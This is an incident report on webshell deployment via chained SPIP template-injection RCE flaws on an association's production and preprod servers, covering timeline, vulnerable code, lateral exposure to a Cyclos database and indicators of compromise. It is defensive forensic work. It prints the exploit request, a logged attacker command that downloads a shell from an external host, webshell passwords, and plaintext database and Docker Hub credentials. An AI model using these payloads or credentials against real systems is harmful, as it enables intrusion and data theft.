# Incident Report — Unauthenticated RCE and Webshell Deployment on www.monel.co

| Field | Value |
|---|---|
| **Incident ID** | INC-2026-08-21-001 |
| **Date of compromise** | 2026-08-21, 08:14 CEST |
| **Date detected** | 2026-08-26 |
| **Report date** | 2026-08-26 |
| **Severity** | Critical — unauthenticated RCE, confirmed shell access, confirmed exposure of the Cyclos production database |
| **Status** | Contained (Apache stopped 2026-08-26) — remediation pending |
| **Point of entry** | `www.monel.co` (SPIP 4.4.16), `/var/www/www.monel.co` |
| **Affected hosts** | `prod-mlml-01` (10.2.1.46 / 162.19.68.97) — compromised 21 Aug<br>`preprod-mlml-01` (10.2.131.167 / 51.91.148.73) — **two separate compromises**: the managed SPIP on 23 Aug, and `/var/www/mlml.fr` from 24 Aug by multiple actors |
| **Sites compromised** | 3 — `www.monel.co`, `www-monel-co.mlml.fr`, `www.mlml.fr` |
| **Reported by** | Rémi Nivet |

---

## 1. Executive summary

On 21 August 2026 an attacker chained two critical, unauthenticated remote code execution
vulnerabilities in SPIP — **CVE-2026-77647** and **CVE-2026-77806**, both CVSS 9.8 — to
place two webshells in the webroot of `www.monel.co`. The attacker obtained arbitrary
command execution as the web server user and interacted with the site for approximately
two hours.

The vulnerabilities lie in SPIP's template compiler: user-supplied request parameters are
embedded into compiled templates via `var_export()` without escaping, and the
`X-Spip-Filtre` request header defeats the encoding that would otherwise neutralise them —
allowing a `<?php` tag supplied in a query string to become executable code.

**Both were already public and already fixed.** SPIP 4.4.20 (17 August) and 4.4.21
(20 August) were available before the intrusion; production ran 4.4.16, deployed on its
release date of 6 July 2026. **Failure to apply available security updates is the direct
cause of this incident** — not a zero-day. Four security releases landed in the eleven days
before the breach and none were applied. See §3.1a.

Notably, after establishing persistence the attacker **patched the vulnerability
themselves** to lock out competing actors. Their patch was defective and, three days
later, took the public site offline — which is what led to detection. The site outage was
caused by the attacker's remediation, not by their payload.

**Database analysis found no persistent compromise:** no rogue accounts, no injected
content, no SEO spam. However, the attacker had full read access to the database and
filesystem, so credential and data exposure must be assumed.

**The most serious consequence is not the SPIP site itself.** `prod-mlml-01` also hosts
the Cyclos production instance. The compromised web-server account was confirmed to have
both read access to world-readable Cyclos database backups and direct read/write access
to the live Cyclos database (§5.2, §5.3).

**Cyclos data integrity has since been verified intact.** Comparison of `pg_dump` backups
spanning the full intrusion window found no modification across all 417 tables — no user,
password, balance, transfer or schema object was altered (§5.7). The write capability
existed but was not exercised. **Disclosure, not modification, is the residual risk.**

The attacker did **not** escalate beyond the web-server user: no SSH compromise, no root
access, no Docker socket access. That privilege level was simply sufficient to reach
everything of value.

This was **mass exploitation, not a targeted attack**: 1,736 exploit attempts from 57
distinct source addresses were recorded against prod between 21 and 26 August.

**`preprod-mlml-01` was compromised twice, independently.** The managed SPIP instance was
breached on 23 August by the actor locked out of prod (§5.6). Separately, a second,
manually-deployed SPIP at `/var/www/mlml.fr` — outside configuration management, running
outdated SPIP 4.3.9, and never patched — absorbed **1,782 of the 1,796 exploit attempts**
against the host and was compromised by **multiple independent actors** from 24 August,
with the last malicious write landing **five hours before containment** (§5.8).

Twelve malicious artefacts were recovered there, including a planted **Adminer** database
client with PostgreSQL support, a 150 KB shell with six command-execution methods and an
`LD_PRELOAD` bypass, and an **ALFA TEaM Shell** CGI channel that works even with PHP's exec
functions disabled.

Because a live webshell sat beside a world-readable production Cyclos dump for three days,
**disclosure of member and financial data is the working conclusion rather than a
precaution** — although Cyclos data integrity has been verified intact (§5.7).

---

## 2. Timeline

All times CEST (UTC+02:00).

| Date/time | Event |
|---|---|
| **2026-08-12** | Earliest retained access log. No exploit attempts present. |
| **2026-08-21 08:14:22** | First exploit attempt from `202.178.126.210` succeeds. `img_cache.php` written to webroot. |
| 2026-08-21 08:14:23 | Attacker confirms shell: `GET /img_cache.php?k=xK3y` → HTTP 200. |
| 2026-08-21 09:48:13 | Shell re-dropped (payload lives in the compiled cache; expiry removes it). |
| 2026-08-21 11:32:18 | Shell re-dropped again. |
| 2026-08-21 11:47:32 | Final drop — this is the `img_cache.php` recovered from disk. |
| 2026-08-21 13:13:49 | `img_cache.php?k=xK3y&c=whoami` — interactive command execution confirmed. |
| 2026-08-21 13:57:33 | `c=wget -O hasil.php https://pastebin.support.one/view/raw/24d74102` — second-stage shell retrieved. |
| 2026-08-21 13:58:28 → 14:06:08+ | Repeated `POST /hasil.php` — interactive use of the file-manager shell. Request bodies not logged. |
| **2026-08-21 15:30:52** | `ecrire/public/compiler.php` modified — attacker patches the vulnerability they exploited. |
| 2026-08-22 → 08-26 | 910 further exploit attempts against prod from other IPs; all fail (blocked by the attacker's patch). |
| **2026-08-21 08:17:03** | First exploit attempt against `/var/www/mlml.fr` on preprod — three minutes after prod fell. 1,782 attempts follow, through 26 Aug. |
| **2026-08-23 05:59** | **`preprod-mlml-01` managed SPIP compromised** by the second actor. `img_cache.php` and `Nx_.php` written to five directories under `/var/www/www-monel-co.mlml.fr`. `compiler.php` left unpatched. |
| **2026-08-24 05:39** | `ALFA_DATA/` (ALFA TEaM Shell CGI API) created in `/var/www/mlml.fr`. |
| 2026-08-25 09:26 → 15:09 | Multiple waves of shells dropped in `/var/www/mlml.fr`, including Adminer and the 150 KB Checkpoint-401 shell. Malformed-command artefacts (`false,` `true,` `fr,`) indicate interactive use. |
| **2026-08-24 23:50:38** | First `Call to undefined function safe_export_env()` error on prod. Public site begins failing as the template cache expires and recompiles. |
| 2026-08-24, 08-26 | Second actor's payload attempted against prod (`nXk` / `X-Nx:Nx-zD1`) — fails, blocked by the first attacker's patch. |
| 2026-08-26 | Prod outage and `hasil.php` noticed. Investigation begins. Webroot, logs and databases preserved. |
| **2026-08-26 09:24** | `IMG/distant/csl/default.php` rewritten in `/var/www/mlml.fr` — last observed malicious write. |
| 2026-08-26 09:39:34 | Final exploit attempt against `/var/www/mlml.fr`. |
| 2026-08-26 ~12:00 | Apache stopped on prod, then on preprod. |
| 2026-08-26 13:56 | Preprod triage confirms the managed-instance compromise. |
| 2026-08-26 14:44 | `/var/www/mlml.fr` triage confirms multi-actor compromise. |

---

## 3. Technical analysis

### 3.1 Vulnerability

SPIP's template compiler embeds the request context into the compiled template with
`var_export()`, unescaped. In `ecrire/public/compiler.php`:

```php
$contexte = "array_merge('.var_export($Pile[0],1).',$contexte)";
```

`$Pile[0]` contains request parameters. A value containing a `<?php` tag is written
verbatim into the compiled skeleton under `tmp/cache/skel/`, which SPIP then executes —
yielding unauthenticated RCE.

### 3.1a Vulnerabilities exploited — both published and patched before the breach

Verified against public advisories on 26 August. **The attacker's `CVE-2026-77647` label was
accurate.** Two distinct vulnerabilities were chained:

| CVE | CVSS | Mechanism | Fixed in | Released |
|---|---|---|---|---|
| **CVE-2026-77647** | 9.8 | Incorrect identification of `<?php` blocks; `var_export()` mishandles a `<` character | **4.4.20** | **17 Aug 2026** |
| **CVE-2026-77806** | 9.8 | Code injection via the `X-Spip-Filtre` request header, mishandled by `analyse_resultat_skel` | **4.4.21** | **20 Aug 2026** |

The exploit used in this incident chains both: the `X-Spip-Filtre: html_entity_decode`
header (77806) defeats the encoding that would neutralise the injected tags, allowing the
`var_export()` injection (77647) to execute. 4.4.21 was required because **4.4.20 itself
remained vulnerable**.

Both were reported anonymously via ANSSI, both were exploited in the wild in August 2026,
and the publisher stated explicitly that SPIP's `ecran_securite.php` **does not mitigate**
them.

> **This was not a zero-day.** The first fix had been available for **four days** and the
> complete fix for **one day** when the site was compromised on 21 August at 08:14.
>
> **Failure to apply available security updates is the direct cause of this incident.**

#### Patching timeline

Production ran **4.4.16, deployed 6 July 2026 — the day of its release**. Patching was
therefore being done. The failure is confined to a dense cluster of releases in the eleven
days before the breach:

| Version | Released | Content | Applied |
|---|---|---|---|
| **4.4.16** | **6 Jul 2026** | Security: stored XSS, SQL injection (private area), full path disclosure | ✅ same day |
| *4.4.17* | — | *Never released — version number skipped by the publisher* | — |
| **4.4.18** | **10 Aug 2026** | Critical, incl. **unauthenticated SQL injection** | ❌ |
| **4.4.19** | **12 Aug 2026** | Corrective (password-reset regression in 4.4.18) | ❌ |
| **4.4.20** | **17 Aug 2026** | Critical — **CVE-2026-77647**, universal pre-auth RCE | ❌ |
| **4.4.21** | **20 Aug 2026** | Critical — **CVE-2026-77806**, pre-auth RCE, active exploitation | ❌ |
| | **21 Aug 08:14** | **Compromise** | |

Two observations. First, the gap is **six weeks**, not months, and the last update was
applied on its release date — this is a lapse in an otherwise functioning practice, not an
abandoned installation. Second, the site was also exposed to the unauthenticated SQL
injection fixed in 4.4.18 from 10 August onward; the evidence shows the RCE was the actual
entry vector, but that exposure existed in parallel.

### 3.2 Exploit

A single unauthenticated GET request:

```
GET /?page=recherche&recherche=<?php header("X-Spip-Filtre: html_entity_decode"); ?>
                               <?php @file_put_contents(_DIR_RACINE."img_cache.php",
                                     base64_decode("...")); ?>&_nocache=<ts>
```

Two mechanisms are worth noting:

- `header("X-Spip-Filtre: html_entity_decode")` instructs SPIP to entity-decode the
  output, defeating the encoding that would otherwise neutralise the injected tags.
- `_nocache` / `var_mode=recalcul` force template recompilation, ensuring the payload is
  re-executed on demand.

Because the payload resides in the compiled cache, it is evicted on cache expiry — which
is why the attacker re-dropped the shell four times before it persisted as a real file.

### 3.3 Payload 1 — `img_cache.php` (dropper/command shell)

792 bytes, plaintext. Gated on `?k=xK3y`, returns HTTP 404 otherwise. Executes `c=` via
the first available of `system`, `passthru`, `exec`, `shell_exec`, `popen`, and reports
`[disabled_functions: no exec available]` if all are blocked.

### 3.4 Payload 2 — `hasil.php` (file manager / mailer)

269,274 bytes on disk; a `\xNN`-encoded string reassembled and passed to
`eval('?>' . $z)`. Decoded payload is 17,949 bytes: a session-authenticated file-manager
webshell presenting a fake Apache "403 Forbidden" page to unauthenticated visitors.

- Password: `Ayamcabegaramasinbanget69%$`
- Capabilities: file upload (`$_FILES` ×4), directory operations, and **two `mail()`
  call sites** — consistent with spam relay.
- Carries `noindex, nofollow, noarchive` meta tags to stay out of search results.

### 3.5 The attacker's patch — and the outage

At 15:30 the attacker rewrote `compiler.php` (with CRLF line endings, based on an older
SPIP revision — several docblocks and two `use` statements were lost), adding:

```php
/**
 * [CVE-2026-77647 patch] Mencegah PHP tag injection via var_export().
 * URL-encode nilai yang mengandung '<' sebelum di-embed ke compiled template.
 */
function safe_export_env($value) {
    if (is_array($value))  { return array_map('safe_export_env', $value); }
    if (is_string($value) && str_contains($value, '<')) { return urlencode($value); }
    return $value;
}
```

and applying it at the injection point:

```php
$contexte = "array_merge('.var_export(safe_export_env($Pile[0]),1).',$contexte)";
```

The comment is Indonesian: *"Prevents PHP tag injection via var_export(). URL-encode
values containing '<' before embedding into the compiled template."* The patch is
functionally correct and demonstrably effective — all subsequent exploit attempts from
other actors failed.

**The defect:** `safe_export_env()` is defined in `compiler.php`, which SPIP loads only
when *compiling* a template. The patched compiler emits calls to that function into the
**cached** templates, which execute without the compiler loaded. Every cache hit therefore
fatals with `Call to undefined function safe_export_env()`. 502 such errors were logged,
affecting `sommaire.html`, `article.html`, `actu.html`, `recherche.html`, `404.html` and
the private admin area.

---

## 4. Impact assessment

### 4.1 Confirmed

- Arbitrary command execution as the web server user (`whoami` executed 13:13:49).
- Outbound network access from the server (`wget` to an external host, 13:57:33).
- Arbitrary file write to the webroot.
- Approximately two hours of interactive file-manager access (13:58 → 14:06+).
- Public site outage from 24 Aug 23:50 until remediation.

### 4.2 Database — no persistent compromise

Analysis of the 26 Aug 01:00 dumps (post-compromise):

| Check | Result |
|---|---|
| `spip_auteurs` | 4 accounts, all legitimate; all `maj` timestamps predate 21 Aug. No rogue admin. |
| MySQL accounts | `root`, `mysql`, `mariadb.sys`, `monel` only. No attacker-created user. |
| Code injection | No `<?php`, `eval(`, `base64_decode`, `<script` in any table. |
| SEO spam | None. (`judi` ×2 = Spanish *"perjudicar"* in the nospam plugin description; `iframe` ×38 = `boxIframe` in mediabox's translated docs. Both benign.) |
| `spip_forum` | Empty — no forum spam. |
| `spip_articles` | No modification after 21 Aug. |

The attacker wrote nothing to the database — consistent with a spam-relay objective rather
than content manipulation.

### 4.3 Must be assumed exposed

"Nothing written" is not "nothing read". The shell could read `config/connect.php` and
therefore the entire database:

- 4 bcrypt password hashes (`$2y$10$…`) — strong, but offline-crackable. **Rotation required.**
- The `monel` database password.
- Any personal data held in articles or documents.

As MLML is a French association, if personal data was accessible a **CNIL breach
notification** may be required within 72 hours of awareness. This is a legal
determination to be made by whoever holds that responsibility.

### 4.4 Not determined

- **What the file manager did.** Driven by POST for roughly two hours; bodies are not
  logged. Filesystem changes and mail volume are unknown.
- **Spam relay volume.** The shell had two `mail()` call sites. Check MTA queues and logs,
  and the domain's reputation/blocklist status.
- **Other vhosts.** The server also hosts `cyclos` and `discourse`. The shell ran as the
  web user, so the blast radius is the host, not just this site.
- **Lateral movement / persistence beyond the webroot.** Cron, SSH authorized_keys and
  system accounts have not been examined.

---

## 5. Lateral exposure and the additional compromised hosts

The SPIP site is one of several services on `prod-mlml-01`. This section records what the
compromised `www-data` account could reach beyond the webroot. **All findings below were
verified by direct execution as `www-data` on the host on 26 August**, not inferred from
configuration.

### 5.1 Cyclos is not isolated from the web server

Three independent architectural facts remove any boundary between the SPIP site and
Cyclos. Containerisation provides packaging here, not security.

| Fact | Source | Consequence |
|---|---|---|
| `network_mode: host` | `roles/docker-cyclos/tasks/main.yaml` | The Cyclos container shares the host network namespace. No network isolation. |
| PostgreSQL runs on the host, `listen_addresses = 0.0.0.0` | `roles/postgres/tasks/main.yaml` | Reachable from any local process, including `www-data`. |
| `ufw ... port 5432 to_ip {{ ssh_ip }}` | `roles/postgres/tasks/main.yaml` | Filters *inbound* traffic only. A local connection to `127.0.0.1:5432` never traverses it. |

### 5.2 CONFIRMED — Cyclos database backups are world-readable

`pg_backup_rotated.sh` runs daily at 04:00 as `postgres`, writing to
`/var/lib/postgresql/backups/` with no `chmod` and a default umask:

```
drwxrwxr-x  2 postgres postgres            .
-rw-rw-r--  1 postgres postgres  41187476  cyclos4.sql.gz
-rw-rw-r--  1 postgres postgres       475  globals.sql.gz
-rw-rw-r--  1 postgres postgres       400  postgres.sql.gz
```

`sudo -u www-data zcat .../cyclos4.sql.gz` succeeded and returned dump content. The
compromised account could read the **complete 41 MB Cyclos production database** with no
credentials and no exploitation. `globals.sql.gz` is a `pg_dumpall -g` — every PostgreSQL
role and its password hash. Retention keeps 7 daily and 5 weekly copies.

### 5.3 CONFIRMED — direct read/write access to the live Cyclos database

```
sudo -u www-data psql "postgresql://cyclos:cyclospwd@127.0.0.1:5432/cyclos4" -c '\dt'
→ accepted_agreements, access_client_logs, access_clients,
  account_balance_limit_logs, account_balances, account_fee_log_events, ...
```

The credential `postgres_pwd=cyclospwd` is stored in plaintext in the git-tracked
`inventory/hosts`, and is trivially guessable independently of that.

**The `cyclos` role owns these tables, so this is write access, not merely read.**
Modification of balances and transaction history was within reach of the compromised
account.

> **Resolved.** Backup comparison across the full intrusion window found no modification
> of any kind — see §5.7. The capability existed; it was not exercised. Disclosure
> remains the live concern.

### 5.4 Not reachable — bounding the damage

| Check | Result |
|---|---|
| Docker socket (`sudo -u www-data docker ps`) | **Denied.** `www-data` is not in the `docker` group — no root-equivalent escape. |
| SSH access | **No compromise.** Only two sources 16–26 Aug: `postgres` from 10.2.131.167 and `ubuntu` from 10.2.129.202. **Zero** failed or invalid attempts. |
| Privilege escalation | **None.** All `su`/root sessions are the 01:00 backupninja cron. `last` shows no interactive login between 3 Jul and 26 Aug. |
| Apache config / TLS keys | Root-owned. Readable but not writable — no proxy tampering, no interception of Cyclos logins. |
| `secrets.enc` | Proper Ansible Vault (AES256). The ansible repo runs from `adm-mlml-01`, not from prod. |

The attacker never escalated beyond `www-data`.

#### Vhost inventory — prod fully accounted for

Because `/var/www/mlml.fr` on preprod (§5.8) was invisible to an ansible-based inventory,
prod's live Apache configuration was reconciled against `prod.yaml` directly
(`apache2ctl -S`, 26 Aug):

| Live vhost | Managed by |
|---|---|
| `communaute.monel.co` | `discourse` role |
| `moncompte.monel.co` | `apache-cyclos` role |
| `www.monel.co` (+ alias `monel.co`) | `monel-spip` role |
| `moncompte.mlml.fr` | **nothing** — hand-created |

`legacy_cyclos_domain=moncompte.mlml.fr` is defined at `inventory/hosts:72` but referenced
in no playbook, role or template; `prod.yaml` invokes `apache-cyclos` only once. The vhost
is therefore unmanaged — but **inert**: it is a redirect for the legacy domain, its
`DocumentRoot` is `/var/www/html`, which contains a single stock Apache `index.html`
(`root:root`, directory `755`, unmodified since May 2022). No PHP, and not writable by
`www-data`.

**No unmanaged application exists on prod.** The `mlml.fr` pattern is confined to preprod.
Caveat on method: `apache2ctl -S` enumerates Apache vhosts only and does not cover
processes bound directly to a port — relevant here because Cyclos uses `network_mode: host`
(8080) and Discourse listens on 3000, though both are Apache-proxied and UFW defaults to
deny.

### 5.5 Permanent evidence gap

PostgreSQL `log_connections` is disabled — zero connection records, and `user=cyclos`
returns 0 matches in both logs. Cyclos application logs show only unrelated WordPress
scanner noise.

**There is no record of whether the Cyclos database was actually accessed, and none can
be recovered.** Given approximately two hours of interactive file-manager access with a
41 MB dump world-readable on the same host, disclosure should be treated as having
occurred. "No evidence of access" is not a defensible position when no evidence could
have been produced either way.

### 5.6 `preprod-mlml-01` — CONFIRMED COMPROMISED, separate intrusion

`preprod.yaml` deploys `monel-spip` with **`spip_version: "4.4.16"`** — the identical
vulnerable release — publicly reachable at `www-monel-co.mlml.fr` (51.91.148.73). Via
`prod-db-backup-sync` and `preprod-reset.yaml`, preprod holds **a full copy of production
Cyclos member data**.

Triage on 26 August (`incidents/triage-preprod.sh`) confirmed a **separate, later
compromise by a different actor**.

#### Webshells present

Dropped **2026-08-23 05:59**, replicated across five directories, all mode `666`
(world-writable):

```
/var/www/www-monel-co.mlml.fr/{,local/,IMG/,tmp/,ecrire/public/}img_cache.php
/var/www/www-monel-co.mlml.fr/{,local/,IMG/,tmp/,ecrire/public/}Nx_.php
```

This is markedly more thorough persistence than on prod, where a single shell sat in the
webroot.

#### Attribution — the actor locked out of prod

`Nx_.php` corresponds to the `nXk` / `X-Nx:Nx-zD1` payload observed **failing** against
prod on 24 and 26 August, blocked there by the first attacker's patch (§3.5). Denied
access to prod, the same actor succeeded on preprod two days earlier. Their `img_cache.php`
hashes differently from prod's (`d63abfc6…` vs `ad1b350f…`) — their own variant reusing
the filename.

#### preprod remains exploitable

`ecrire/public/compiler.php` hashes to the pristine `c479dc2e…`, and `safe_export_env`
appears nowhere. **This attacker did not patch the vulnerability behind them.** Two
consequences:

1. Preprod is **immediately re-exploitable** the moment Apache is restarted. It must stay
   down until rebuilt.
2. There was no self-inflicted outage, which is why the intrusion went unnoticed. Prod
   surfaced only because the first attacker broke it.

#### Production data was reachable from the compromised host

```
-rw-rw-r-- 1 backup backup 41187476  /var/backups/postgresql_prod/latest-daily/cyclos4.sql.gz
-rw-rw-r-- 1 backup backup      475  .../globals.sql.gz
```

`sudo -u www-data zcat` succeeded. A live file-manager webshell sat alongside a
world-readable 41 MB production Cyclos dump for three days (23–26 August) on a host the
attacker fully controlled. Synced copies of prod's MySQL dumps and SPIP `IMG/` were
equally reachable.

**This changes the disclosure assessment.** On prod, exposure was real but access
unprovable (§5.5). Here, means, access and opportunity are all confirmed. Disclosure of
Cyclos member and financial data should be treated as the working conclusion rather than
a precautionary assumption — with direct bearing on §8 item 17.

#### Scope not yet closed — a second, unmanaged SPIP instance

Access logs record HTTP 200 responses for files absent from the ansible-managed SPIP
docroot:

```
4× POST /sitemap.php     3× GET /shadow.php
3× GET /bootstrap.php    1× GET /_dec_cvfmev.php
```

Attempt distribution locates them: **1,782 exploit attempts against the `mlml.fr` vhost**
versus only 14 against `www-monel-co.mlml.fr`.

That vhost has since been identified as **a second SPIP instance serving `www.mlml.fr`,
manually deployed at `/var/www/mlml.fr`**. It is *not* ansible-managed, so:

- its SPIP version is unknown and unlikely to be 4.4.16 — it may additionally be exposed
  to older published SPIP RCEs, not just CVE-2026-77647 / CVE-2026-77806;
- it appears in no playbook, so it was absent from every prior inventory of what runs on
  these hosts, and from the patching process;
- it absorbed **99.2% of the exploit traffic** aimed at preprod.

Given four shells returned HTTP 200 on this vhost, it should be presumed compromised
pending triage. Script: `incidents/triage-preprod-mlml.sh`.

**This is the more important finding of the two.** An unmanaged, unversioned, unpatched
SPIP was reachable from the internet on a host holding production Cyclos data, and nothing
in the deployment tooling would ever have revealed it.

#### Not reachable on preprod

| Check | Result |
|---|---|
| `/var/backups/.ssh/id_rsa` (key for `postgres@prod`) | **Permission denied.** `-rw------- backup backup`. The preprod → prod lateral path is closed. |
| SSH access | No compromise. Only `ubuntu` from 10.2.129.202; zero failed attempts. |
| Docker socket | Denied. |

#### Configuration drift

`prod-db-backup-sync` specifies the sync on `adm-mlml-01` at 05:00 daily. It in fact runs
from **preprod**, and the crontab minute field is malformed:

```
* 05 * * *   rsync … postgres@10.2.1.46:/var/lib/postgresql/backups/ …
```

`* 05` is *every minute during hour 05*, not 05:00 — accounting for the 2,640 `postgres`
SSH logins to prod in ten days. The same error affects the 06 and 07 entries, which
additionally pull prod's MySQL dumps and SPIP `IMG/`.

### 5.7 Cyclos integrity verification — NO TAMPERING FOUND

Three daily `pg_dump` backups of `cyclos4` were compared: **2026-08-20 04:59**
(pre-intrusion), **2026-08-22 04:59**, and **2026-08-26 04:59** (after Apache was stopped).
The window brackets actor 1's entire session on prod (21 Aug 08:14–15:30) and extends
through to containment.

Method: each `COPY` block was extracted per table and SHA-256'd, so the comparison is a
positive verification of every table rather than an absence of diff output.

#### Result — full window, 20 → 26 August

| Measure | Result |
|---|---|
| Tables compared | **417** |
| Tables differing | **3** — `application`, `db_lock`, `polling_task_executions` |
| Tables added / removed | none / none |
| Schema objects | 1,742 on all three dates — no table, function, trigger, index or sequence added |
| Data rows total | 24,882, of which 52 sit in the three differing tables |
| PostgreSQL roles (`globals.sql.gz`) | identical on all three dates, including password hashes; only `cyclos` and `postgres` exist |

The three differing tables are system-internal:

- `polling_task_executions` (50 rows) — scheduled-task timestamps
- `db_lock` (1 row) — instance heartbeat, `162.19.68.97 4.15.5 <timestamp>`
- `application` (1 row) — one opaque binary blob, identical prefix and unchanged
  `4.15 / 178 / a8f807ce…` record; consistent with Cyclos' routine self-check, though the
  blob was not decoded

#### Security and financial tables — all byte-identical

`users` (154), `passwords` (194), `password_logs` (44), `accounts` (18),
`account_balances` (17), `transfers` (6), `transactions` (13), `transfer_types` (3),
`groups` (6), `access_clients` (0), plus the full audit trail — `login_history_logs`
(1,042), `entity_logs` (5,112), `entity_property_logs` (5,957), `user_status_logs`,
`user_group_logs`, `failed_action_logs`, `error_logs`, `db_history_logs`.

**No user was added or modified, no password hash changed, no balance or transfer altered,
and no schema object introduced at any point during the intrusion.**

#### Why this is conclusive

The attacker held direct PostgreSQL credentials (§5.3). Cyclos writes `entity_logs` at the
application layer, not via database triggers, so a direct SQL write would leave the audit
trail untouched — **unchanged audit tables would prove nothing on their own.** The dump
comparison does not share that weakness: any modification, by any route, necessarily
appears in `pg_dump` output. That is what makes this conclusive rather than merely
reassuring.

#### Caveat — the window was quiet

`login_history_logs` is unchanged at 1,042 rows across all three dates, meaning **nobody
logged into Cyclos during the period** — neither the attacker nor any legitimate member.
The absence of change is genuine, but the system was idle, so this demonstrates that the
attacker did not act rather than that activity would have been detected.

#### Conclusion

For Cyclos, **disclosure remains the concern; modification is ruled out.** The
financial-integrity question raised in §5.3 is answered negatively for the whole
intrusion window. Confidentiality findings (§5.2, §5.6) are unaffected.

### 5.8 `/var/www/mlml.fr` — CONFIRMED COMPROMISED, multiple actors

The `mlml.fr` vhost identified in §5.6 is a second SPIP instance serving `www.mlml.fr`,
manually deployed and outside configuration management. Triage on 26 August
(`incidents/triage-preprod-mlml.sh`) and static analysis of the recovered webroot confirm
a **severe, multi-actor compromise that was still active hours before containment**.

#### Vulnerable throughout

Running **SPIP 4.3.9** — an outdated release. The injection sink is intact at
`ecrire/public/compiler.php:229`:

```php
$contexte = "array_merge('.var_export($Pile[0],1).',$contexte)";
```

`safe_export_env` appears nowhere. Unlike prod, no attacker patched this instance, so it
was continuously exploitable and **remains so until rebuilt**.

Contributing factors: docroot files are mode `777`/`666` owned by `www-data`, which is why
shells could be written into `plugins-dist/` and `prive/` — directories that should be
read-only to the web user. `config/ecran_securite.php` (SPIP's security screen) is
installed and did not prevent any of this.

#### Attack window

**1,782 exploit attempts, 21 Aug 08:17:03 → 26 Aug 09:39:34** — beginning three minutes
after the first successful exploit on prod, from the same campaign and overlapping source
addresses. Payloads were dropped in distinct waves:

| When | Artefact |
|---|---|
| 24 Aug 05:39 | `ALFA_DATA/` |
| 25 Aug 09:26 | `plugins/bootstrap.php` |
| 25 Aug 12:20 | zero-byte files `false,` `true,` `fr,` |
| 25 Aug 15:09 | bulk drop — five shells |
| **26 Aug 09:24** | `IMG/distant/csl/default.php` rewritten |

The last write landed roughly five hours before triage. Two zero-byte files named `false,`
and `true,` are artefacts of malformed shell commands — evidence of hands-on-keyboard use
rather than purely automated dropping.

#### Artefacts recovered and analysed

Twelve malicious files, representing **several unrelated toolkits — this host was worked
by multiple independent actors, not one**.

| Path | Size | Identification |
|---|---|---|
| `prive/modeles/import-dispatcher.php` | 476 KB | **Adminer** — full browser-based database client |
| `plugins-dist/bigup/stats-mailer.php` | 48 KB | XChaCha20-Poly1305 loader → **150 KB "Checkpoint-401 / 3x10taction" shell** |
| `plugins-dist/compresseur/media-handler.php` | 95 KB | YAK Pro obfuscated (918 `goto` labels); **not fully decoded** |
| `IMG/distant/csl/principalxml.php` | 46 KB | base85+XOR loader (same family as `fix-encoder.php`) |
| `tmp/upload/document.php` | 41 KB | **"NESIA DARKNET — LOCKED SHELL"**, password `ajitHere.com483#!!` |
| `IMG/distant/csl/default.php` | 20 KB | nested XOR loader → 56 KB bcrypt-gated file manager |
| `plugins-dist/sites/fix-encoder.php` | 6.9 KB | base85+XOR loader → 21 KB file-manager shell |
| `plugins/bootstrap.php` | 608 B | plain file uploader |
| `IMG/gif/asset-draft.php` | 411 B | plain file uploader |
| `ALFA_DATA/alfacgiapi/{bash,perl,py}.alfa` | — | **ALFA TEaM Shell** CGI API |

Note the naming: unlike the crude `img_cache.php` on the other two hosts, these use
plausible filenames inside legitimate SPIP plugin directories. A casual review of
`plugins-dist/bigup/` would not flag `stats-mailer.php`.

#### Capability analysis

**`import-dispatcher.php` — Adminer.** Not a webshell but a legitimate database
administration tool, planted. Compiled with **MySQL, PostgreSQL, SQLite, MSSQL, Oracle,
MongoDB and Elasticsearch drivers** — a browser-based client able to reach any database
the host can. On a machine also running a Cyclos PostgreSQL container, this is the most
consequential single artefact.

**`stats-mailer.php` — the largest shell.** A libsodium XChaCha20-Poly1305 AEAD loader; the
key is embedded, so the payload was recoverable. Decrypts to 150 KB: HMAC-cookie
authentication (functions without PHP sessions), password `Bajingan#1337`, bcrypt with
SHA-256 fallback. Capabilities:

- command execution via **six independent methods** — `exec`, `shell_exec`, `system`,
  `passthru`, `proc_open`, `popen`
- **`putenv` + `LD_PRELOAD`** — a `disable_functions` bypass
- file upload (`move_uploaded_file` ×6), `chmod`, 21 `unlink` sites
- database access — `mysqli_connect` ×4, `PDO` ×5
- outbound network — `curl_exec`, `fsockopen`
- `mail()` ×3 — spam relay

**`ALFA_DATA/alfacgiapi/`** contains Python, Perl and Bash CGI scripts with an `.htaccess`
registering `.alfa` as a CGI handler (`AddHandler cgi-script .alfa`), signed
`#Coded By Sole Sad & Invisible`. Each accepts a base64 `cmd` POST parameter and executes
it. **This provides command execution even if PHP's exec functions are disabled entirely** —
an independent fallback channel that a PHP-only review would miss.

**No hardcoded command-and-control was found in any decoded payload.** The only external
references are CDNs serving the shells' own UI (cdnjs, Google Fonts, imgur). These are
interactive, operator-driven tools rather than automated botnet implants — consistent with
the hands-on-keyboard evidence.

`media-handler.php` remains **only partially analysed**: YAK Pro control-flow flattening
with 918 `goto` labels and encoded string literals. `proc_open` and a `github.com`
reference are visible; its full capability set is undetermined. It should be treated as a
functioning shell.

#### Not established

- **Whether the shells were used, and for what.** The triage script's check #12 was
  malformed — it matched exploit *attempts* containing these filenames rather than requests
  *to* them. Actual usage remains unquantified (§8 item 5).
- **Whether the compromise predates 21 August.** SPIP 4.3.9 is old enough that an earlier,
  unrelated intrusion is plausible; `ALFA_DATA` appearing on the 24th does not date the
  initial access.
- **Which database this instance uses** — `config/connect.php` was not captured in the
  triage output, so whether it shares MariaDB with the managed instance is unknown.

### 5.9 Exposure ranking

1. **Cyclos production database** — confirmed readable on both hosts; **integrity verified intact (§5.7)**, so the residual risk is disclosure of member and financial data
2. **`preprod-mlml-01`** — confirmed compromised, still unpatched, scope not yet closed
3. **`globals.sql.gz`** — all PostgreSQL role password hashes, on both hosts
4. **`/var/www/mlml.fr`** — confirmed compromised by multiple actors; 12 artefacts including a planted Adminer DB client and an ALFA CGI channel; still unpatched
5. **Discourse backups** — `/var/lib/discourse/sidekiq_data/public/backups/default` is `o+rx`; contents unverified
6. **Credentials committed to git** — `postgres_pwd=cyclospwd`, Docker Hub `mlmel` / `@sVY8LE8uOvs`

---

## 6. Indicators of compromise

### Files — `prod-mlml-01` (actor 1)

| Path | Size | Modified | SHA-256 |
|---|---|---|---|
| `img_cache.php` | 792 | 2026-08-21 11:47:32 | `ad1b350ff89c2bed2f16ebb3fa41d7bf0d6ab588ae040aa25f44bef89da1ff30` |
| `hasil.php` | 269,274 | 2026-08-21 13:57:34 | `f218b883a6e2cc76ec61fbfd541c4b2dd970a1021b0d429e505251c8fbb2c865` |
